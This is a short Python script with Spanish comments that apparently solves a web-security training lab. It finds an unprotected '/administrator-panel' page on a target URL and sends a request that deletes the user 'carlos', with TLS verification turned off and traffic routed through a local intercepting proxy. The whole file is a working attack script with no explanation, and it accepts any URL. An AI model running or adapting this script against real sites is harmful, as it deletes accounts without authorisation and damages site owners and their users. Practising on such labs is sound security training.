import requests
import sys
import urllib3

# Desactiva las advertencias de seguridad SSL/TLS para simplificar la salida
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configura los proxies si es necesario para la solicitud
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    """Intenta eliminar un usuario específico del panel de administración."""
    admin_path = '/administrator-panel'
    delete_path = '/delete?username='
    username = 'carlos'
    
    try:
        # Busca la página de administración
        admin_url = url + admin_path
        response = requests.get(admin_url, verify=False, proxies=proxies)
        
        if response.status_code == 200:
            print("[+] Página de administración encontrada...")
            print("[+] Eliminando usuario...")
            # Intenta eliminar el usuario
            response_delete = requests.get(admin_url + delete_path + username, verify=False, proxies=proxies)
            
            if response_delete.status_code == 200:
                print(f"[+] Usuario {username} eliminado.")
            else:
                print(f"[-] No fue posible eliminar al usuario {username}.")
        else:
            print("[-] Página de administración no encontrada.")
    except requests.RequestException as e:
        print(f"[-] Error al realizar la solicitud: {e}")

def main():
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <url>")
        print(f"Ejemplo: {sys.argv[0]} www.example.com")
        return
    
    url = sys.argv[1]
    delete_user(url)

if __name__ == "__main__":
    main()
